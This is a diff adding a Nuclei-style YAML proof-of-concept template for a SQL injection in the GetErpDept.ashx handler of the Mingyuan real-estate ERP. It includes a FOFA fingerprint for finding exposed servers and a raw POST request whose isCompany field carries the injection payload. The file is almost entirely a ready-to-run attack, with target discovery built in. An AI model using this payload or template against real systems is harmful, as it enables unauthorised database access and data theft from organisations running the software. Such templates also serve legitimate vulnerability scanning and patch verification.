@@ -1,0 +1,30 @@
+id: poc-xe9he9242ptc7ia8
+info:
+  name: 明源地产ERP GetErpDept 存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/xe9he9242ptc7ia8'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: xe9he9242ptc7ia8
+    fofa: body="/_common/scripts/md5-min.js"
+http:
+- raw:
+  - 'POST /XmjdUI/Handle/GetErpDept.ashx HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
+
+    Accept-Encoding: gzip, deflate
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    isCompany='') and 1=@@VERSION--'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
